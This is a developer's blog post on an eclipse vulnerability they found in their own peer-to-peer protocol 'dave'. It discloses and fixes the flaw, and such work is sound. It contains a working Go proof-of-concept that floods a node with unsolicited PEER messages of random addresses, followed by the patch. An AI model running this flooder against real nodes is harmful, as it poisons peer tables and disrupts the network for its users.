---
title: Solving an eclipse attack vulnerability in dave
description: While improving my description of the dave protocol, I discovered an eclipse attack. Here, I implement the attack to prove that the vulnerability exists, and then resolve the vulnerability. 
date: 2024-05-29
---
While describing the measures that I had taken to remain resilient to different types of attacks, I thought of a significant vulnerability in the dave protocol. That just goes to show the value of communication and (internal) feedback when engineering.

I was describing how dave will drop packets containing more than GETNPEER peer descriptors. This prevents an eclipse attack where the attacker sends many peer descriptors, poisoning the remote's peer table.

While this is indeed one necessary precaution to guard against, coupled only with the packet filter the protocol sill leaves one door wide open. An attacker can simply send PEER messages within the bounds of the filter's policy. This results in the remote's peer table becoming poisoned with either random or malicious addresses.

The obvious solution, and the one that I implemented, is to only add peers if we're expecting peers. This is achieved by adding a boolean to the peer type. The flag is named `getpeer`, and is set before sending a GETPEER message, and unset when receiving a PEER message. If a PEER message is received, and the flag is not set for the remote, the packet is dropped.

# Proving existence of the vulnerability

## Implementation
The following program is an implementation of the attack. As you see, it's as simple as sending random addresses.
```go
package main

import (
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/netip"
	"os"
	"strings"
	"time"

	"github.com/intob/godave"
	"github.com/intob/godave/dave"
)

func main() {
	laddr := flag.String("l", "[::]:2618", "Dave's listen address:port")
	edge := flag.String("e", ":127", "Dave's bootstrap address:port")
	epoch := flag.Duration("epoch", 20*time.Microsecond, "Dave epoch")
	flag.Parse()
    // Make dave with sensible settings, logging unbuffered to stdout
	d := makeDave(*laddr, *edge, 100000, 10000, 50000, *epoch, os.Stdout)
    // Send 1M random addresses to random peers
	for i := 0; i < 1000000; i++ {
		d.Send <- &dave.M{
			Op:  dave.Op_PEER,
			Pds: []*dave.Pd{pdfrom(rndaddr()), pdfrom(rndaddr())},
		}
		time.Sleep(*epoch) // Don't hit remote packet filter (we're testing with one local peer)
	}
}

// Generate random address
func rndaddr() netip.AddrPort {
	return netip.MustParseAddrPort(fmt.Sprintf("%d.%d.%d.%d:%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(65535)))
}

// Parse address to Peer Descriptor
func pdfrom(addrport netip.AddrPort) *dave.Pd {
	ip := addrport.Addr().As16()
	return &dave.Pd{Ip: ip[:], Port: uint32(addrport.Port())}
}

func makeDave(lap, edge string, dcap, fcap, prune uint, epoch time.Duration, lw io.Writer) *godave.Dave {
	edges := make([]netip.AddrPort, 0)
	if edge != "" {
		if strings.HasPrefix(edge, ":") {
			edge = "[::1]" + edge
		}
		addr, err := netip.ParseAddrPort(edge)
		if err != nil {
			exit(1, "failed to parse -b=%q: %v", edge, err)
		}
		edges = append(edges, addr)
	}
	laddr, err := net.ResolveUDPAddr("udp", lap)
	if err != nil {
		exit(2, "failed to resolve UDP address: %v", err)
	}
	lch := make(chan []byte, 10)
	go func() {
		for l := range lch {
			lw.Write(l)
		}
	}()
	d, err := godave.NewDave(&godave.Cfg{
		LstnAddr:  laddr,
		Edges:     edges,
		DatCap:    dcap,
		FilterCap: fcap,
		Prune:     uint64(prune),
		Epoch:     epoch,
		Log:       lch})
	if err != nil {
		exit(3, "failed to make dave: %v", err)
	}
	return d
}

func exit(code int, msg string, args ...any) {
	fmt.Printf(msg, args...)
	os.Exit(code)
}

```
The above program starts a dave, and sends 1 million packets containing 2 random addresses.

## Result
As you can see from the following images, we were able to poison the remote with 8293 random addresses. The program then struggled to ping all of those addresses, and eventually recovered once they had been dropped. One optimisation here would be to be less tolerant of a remote taking time to respond if we've not heard from them before. This would have accelerated the dropping of bogus addresses. However, this adds complexity for only a small gain. Let's focus on the issue at hand...

### Poisoned
![poison](/img/cs/dave/eclipse/poison/3840.avif)

### Recovered
![recovered](/img/cs/dave/eclipse/poison_drop/3840.avif)

# Implementing solution
So the vulnerability is real and trivial to implement. Let's solve it. The solution is just a few lines...
Add the new boolean property, set it when pinging a peer, and check it before accepting new peers.

## Add getpeer property to peer type
```go
type peer struct {
	pd          *dave.Pd // Peer descriptor
	fp          uint64   // Address hash
	added, seen time.Time
	edge        bool    // Set for edge (bootstrap peers
	getpeer     bool    // Set when GETPEER sent, unset when PEER received. Prevents eclipse.
	trust       float64 // Accumulated mass of new dats from peer
}
```

## Set getpeer property before pinging a peer
Somewhere inside the main event loop lies this condition. Each PING epoch, we iterate over the peer table, dropping peers silent for DROP epochs, and pinging peers not heard from in PING epochs. We simply need to set our new property to true when pinging a peer.
```go
// ...
if nepoch%PING == 0 { // PING AND DROP
	for pid, p := range prs {
		if !p.edge && time.Since(p.seen) > epoch*DROP { // DROP UNRESPONSIVE PEER
			delete(prs, pid)
			lg(log, "/d/ping/delete %x\n", p.fp)
		} else if time.Since(p.seen) > epoch*PING { // SEND PING
			p.getpeer = true
			pktout <- &pkt{&dave.M{Op: dave.Op_GETPEER}, addrfrom(p.pd)}
			lg(log, "/d/ping/ping %x\n", p.fp)
		}
	}
}
// ...
```

## Check getpeer property before accepting new peers
If we're not expecting peers, we simply ignore the packet. Somewhere in the main event loop...
```go
// ...
switch m.Op {
case dave.Op_PEER: // STORE PEERS
	if p.getpeer {
			p.getpeer = false
	} else {
			lg(log, "/d/h/peer/eclipse dropped %x\n", p.fp)
			continue
	}
	for _, pd := range m.Pds {
			pid := pdstr(pd)
			_, ok := prs[pid]
			if !ok {
					p := &peer{pd: pd, fp: pdfp(h, pd), added: time.Now(), seen: time.Now()}
					prs[pid] = p
					lg(log, "/d/h/peer/add_from_gossip %x\n", p.fp)
			}
	}
// ...
}
// ...
```

# Solution demo
As you can see, any unexpected PEER messages are simply dropped.
![solution_demo](/img/cs/dave/eclipse/solution/3840.avif)